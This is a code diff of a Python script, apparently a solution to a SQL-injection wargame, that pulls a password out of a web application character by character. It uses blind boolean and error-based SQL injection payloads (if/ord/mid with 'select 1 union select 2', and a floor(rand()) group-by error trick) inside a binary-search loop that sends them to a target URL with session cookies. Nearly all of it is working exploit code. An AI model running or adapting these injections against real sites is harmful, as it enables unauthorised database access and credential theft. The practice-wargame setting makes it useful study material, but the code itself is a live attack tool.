@@ -43,20 +43,27 @@ def main():
     len_of_key = los.find_key_len(url, param, check_func, cook)
 
     print(len_of_key)
-
+    '''
     payload = "'||if(ord(mid(pw,%s,1))%s,1,(select 1 union select 2))#"
     param = dict(pw=payload)
     result = los.find_binary(
         url, param, check_func, 32, 127, len_of_key, cook)
+    '''
 
-    # Alternative with bit function 256 requests, 218 in binary search
-    '''
-    payload = "'||if(mid(lpad(bin(ord(mid(pw,%s,1))),%s,0),%s,1),1,(select 1 union select 2))#"
-    param = dict(pw=payload)
-    result = los.find_pass_over_bits(
-        url, param, len_of_key, check_func, cook)
-    '''
-    # Error-Based SQL injection
+    result = ''
+    num_of_requests = 0
+    for i in range(1, len_of_key + 1):
+        payload = f"'||if(ord(mid(pw,{i},1))<%s,1,(select 1 union select 2))#"
+        param = dict(pw=payload)
+        left, num_requests = los.find_binary(url, param, check_func,
+                                             32, 127, cook)
+        print(chr(left))
+        result += chr(left)
+        num_of_requests += num_requests
+
+    print('num_of_requests:', num_of_requests)
+
+    # Alternative Error-Based SQL injection
     ''' 
     payload = "'||(select concat(floor(rand(33)*2),pw)x from (select 1 union select 2)t group by x having min(0))#"
     '''
